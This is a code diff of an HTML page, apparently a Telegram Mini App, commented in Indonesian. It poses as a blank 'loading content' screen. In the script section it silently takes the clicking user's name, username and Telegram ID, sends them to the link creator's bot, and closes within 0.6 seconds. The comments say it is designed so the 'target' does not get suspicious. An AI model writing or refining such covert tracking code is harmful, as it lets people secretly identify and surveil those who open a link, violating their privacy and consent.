@@ -1,32 +1,68 @@
 <!DOCTYPE html>
-<html>
+<html lang="id">
 <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sistem Memuat</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        body { background: white; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; }
+        body {
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #ffffff; /* Putih polos agar tidak curiga */
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            color: #999;
+        }
+        .loader {
+            text-align: center;
+        }
     </style>
 </head>
 <body>
-    <p>Memuat konten...</p>
+
+    <div class="loader">
+        <p>Memuat konten...</p>
+    </div>
 
     <script>
+        // Inisialisasi Telegram Web App
         const tg = window.Telegram.WebApp;
         tg.ready();
+        tg.expand(); // Membuka Mini App secara penuh
 
+        // Ambil data target (orang yang klik link)
         const user = tg.initDataUnsafe.user;
+        
+        // Ambil ID kamu (penerima notif) dari parameter startapp
+        const params = new URLSearchParams(window.location.search);
         const creatorId = tg.initDataUnsafe.start_param;
 
+        // Cek apakah data tersedia
         if (user && creatorId) {
-            // Mengirim data ke bot secara stealth
-            tg.sendData(json.stringify({
+            // Data yang akan dikirim balik ke Bot Termux
+            const payload = {
                 "penerima_notif": creatorId,
-                "nama_pengklik": user.first_name,
-                "user_pengklik": user.username || "n/a",
-                "id_pengklik": user.id
-            }));
-            
-            // Supaya tidak curiga, setelah kirim data, tutup app
-            setTimeout(() => { tg.close(); }, 500);
+                "nama_pengklik": user.first_name || "Tanpa Nama",
+                "id_pengklik": user.id,
+                "user_pengklik": user.username || "n/a"
+            };
+
+            // Mengirim data secara stealth melalui fungsi sendData
+            // Ini akan memicu handler 'handle_service_data' di bot.py
+            tg.sendData(JSON.stringify(payload));
+
+            // Tutup aplikasi secara otomatis setelah berhasil kirim (dalam 0.6 detik)
+            // Target tidak akan sempat melihat apa-apa selain layar putih sebentar
+            setTimeout(() => {
+                tg.close();
+            }, 600);
+        } else {
+            // Jika dibuka secara manual tanpa link tracking, biarkan saja atau tutup
+            console.log("Data tidak lengkap.");
         }
     </script>
 </body>
